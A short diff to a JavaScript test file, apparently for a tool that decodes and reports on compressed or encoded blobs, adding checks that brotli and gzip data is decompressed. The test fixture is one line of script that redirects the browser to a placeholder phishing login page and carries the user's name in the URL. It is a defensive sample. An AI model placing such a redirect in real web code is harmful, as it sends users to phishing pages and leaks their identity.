@@ -79,5 +79,12 @@ assert.equal(rep.blobs[0].recovered.text, pt);
 assert.equal(rep.blobs[1].bytes.verdict, 'random');
 assert.equal(rep.blobs[1].recovered, undefined);
 assert.ok(rep.code.compression.ratio < 0.5);
+// E90: brotli ve gzip blob'ları rapor aşamasında açılır
+const { brotliCompressSync, gzipSync } = await import('node:zlib');
+const payload = 'document.location = "https://phish.example/login?u=" + encodeURIComponent(user);';
+const rep2 = await blobReport([brotliCompressSync(Buffer.from(payload)).toString('base64'), gzipSync(Buffer.from(payload)).toString('base64')]);
+assert.equal(rep2.blobs[0].decompressed.format, 'brotli');
+assert.equal(rep2.blobs[0].decompressed.text, payload);
+assert.equal(rep2.blobs[1].decompressed.format, 'gzip');
 
 console.log('stats: ok');
